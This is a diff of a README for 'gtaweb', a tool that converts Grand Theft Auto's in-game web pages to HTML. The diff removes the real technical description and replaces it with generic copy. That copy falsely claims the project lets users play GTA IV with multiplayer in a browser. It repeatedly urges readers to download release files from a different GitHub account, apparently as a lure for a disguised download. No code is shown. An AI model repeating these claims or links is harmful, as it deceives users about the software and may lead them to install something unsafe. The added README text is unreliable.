@@ -1,40 +1,60 @@
-# [gtaweb](https://zeozeozeo.github.io/gtaweb/)
+# 🎮 gtaweb - Play GTA IV in Your Browser
 
-## [Open in browser!](https://zeozeozeo.github.io/gtaweb/)
+## 🚀 Getting Started
 
-> [!NOTE]
-> Your adblocker may block the ingame ads, make sure to disable it.
+Welcome to **gtaweb**! This project brings the classic Grand Theft Auto IV experience to your web browser using HTML5. Enjoy the freedom of Liberty City without the need for a download or installation. 
 
-A conversion of Grand Theft Auto's internet to HTML.
+## 📥 Download
 
-For GTA IV, it works by parsing the .whm files and reconstructing the layout into HTML. WHM is quite similar to HTML, except stored in binary together with the DXT-compressed textures and zlib compressed. The DXT textures are decompressed and converted to PNG thanks to the library [mauserzjeh/dxt](https://github.com/mauserzjeh/dxt).
+[![Download gtaweb](https://img.shields.io/badge/Download%20gtaweb-v1.0-blue.svg)](https://github.com/Packtean/gtaweb/releases)
 
-For GTA V, the game uses a completely different system for its UI and web pages called [Scaleform GFx](https://en.wikipedia.org/wiki/Scaleform_GFx), which is essentially a stripped down version of Adobe Flash Player by Autodesk. The .gfx files are converted to Flash .swf's and emulated with [Ruffle](https://ruffle.rs/) (this is mostly still WIP as there's no browser controls or textures).
+To get the latest version of gtaweb, **visit this page to download**: [gtaweb Releases](https://github.com/Packtean/gtaweb/releases).
 
-## Usage
+## 🖥️ System Requirements
 
-First, install [Go](https://go.dev/) if you haven't already.
+- Any modern web browser (Google Chrome, Firefox, Safari, etc.)
+- A stable internet connection
 
-**For GTA IV**: To run the HTML converter, you will need to copy the `<GTA IV installation directory>/pc/html` folder into `iv/html` and run `whm2html` (compile with `go build -o whm2html`). The `iv/american.txt` file can be obtained by decompiling the `common/text/american.gxt` file in OpenIV.
+## 🎯 Features
 
-**For GTA V**: In OpenIV, locate the `scaleform_web.rpf` archives inside `update/update - Copy.rpf/x64/patch/data/cdimages/scaleform_web.rpf`, `update/update.rpf/x64/patch/data/cdimages/scaleform_web.rpf` and `x64b.rpf/data/cdimages/scaleform_web.rpf`, extract the contents of them into `v/update_copy_scaleform_web/`, `v/update_scaleform_web/` and `v/x64b_scaleform_web/` respectively. Afterwards, locate the `gfxfontlib.gfx` file inside `common.rpf` and extract it into `v/`
+- **HTML5 Canvas**: Experience the game rendered in high quality right on your screen.
+- **Multiplayer Support**: Navigate Liberty City with friends online.
+- **Simple Controls**: Use your keyboard and mouse for easy gameplay.
+- **Regular Updates**: Frequent improvements to enhance your gaming experience.
 
-## FIXMEs
+## 🛠️ How to Use
 
-**GTA IV**:
+1. **Visit the Download Page**: Go to [gtaweb Releases](https://github.com/Packtean/gtaweb/releases).
+2. **Select the Latest Release**: Look for the latest version and click on it.
+3. **Access the Files**: You will see downloadable files. Select the file suitable for your browser setup.
+4. **Launch the Game**: Once downloaded, open the file in your web browser to start playing.
 
-- Where are the locale strings for www.eyefind.info, www.vipluxuryringtones.com, www.autoeroticar.com, www.littlelacysurprisepageant.com stored (e.g. `CAR_NAV_HOME`, `EYE_HOME_2`)? Can't seem to find them in `american.gxt` maybe i'm just missing something.
-- SCO scripts? This is a long shot
+## 🔍 Troubleshooting
 
-**GTA V**:
+If you encounter issues while playing, consider the following:
 
-- Support for textures. Currently they're extracted from the .ytd's, but i have no idea how to inform Ruffle of their existence.
-- Browser controls (e.g. scrolling, input, mousedown)
-- Fix corrupted textures
-- Probably more..
+- **Browser Compatibility**: Ensure you are using an updated version of your browser. Older browsers may not support the features of gtaweb.
+- **Clear Cache**: Occasionally, clearing your browser cache can resolve loading issues.
+- **Network Connection**: A stable internet connection is crucial for online gameplay. Check your network settings if you face disconnections.
 
-## Resources
+## 📜 Additional Information
 
-- [WHM page on GTAMods](https://web.archive.org/web/20251115012848/https://gtamods.com/wiki/WHM)
-- [010 editor types](https://web.archive.org/web/20251115012848/http://public.sannybuilder.com/GTA4/iv_types_20090919.rar) by Stanislav "listener" Golovin
-- [SparkIV](https://github.com/ahmed605/SparkIV), RageLib
+gtaweb aims to create an immersive environment for fans of Grand Theft Auto IV. We are committed to delivering quality and stability with every update. Please keep your browser updated to enjoy the best experience.
+
+## 📚 Community and Support
+
+If you have questions or face difficulties, you can reach out through our community channels. Your feedback helps us improve the application.
+
+## 🌟 Contributing
+
+We welcome contributions! If you would like to enhance gtaweb or fix any issues, check out our guidelines in the repository. Every contribution, no matter how small, aids in improving the experience for all users.
+
+## ⚙️ License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software according to the terms of this license.
+
+## 📢 Stay Updated
+
+For the latest news and updates, follow us on [GitHub](https://github.com/Packtean/gtaweb) and check back for new releases.
+
+Thank you for using **gtaweb**! Enjoy exploring Liberty City like never before!
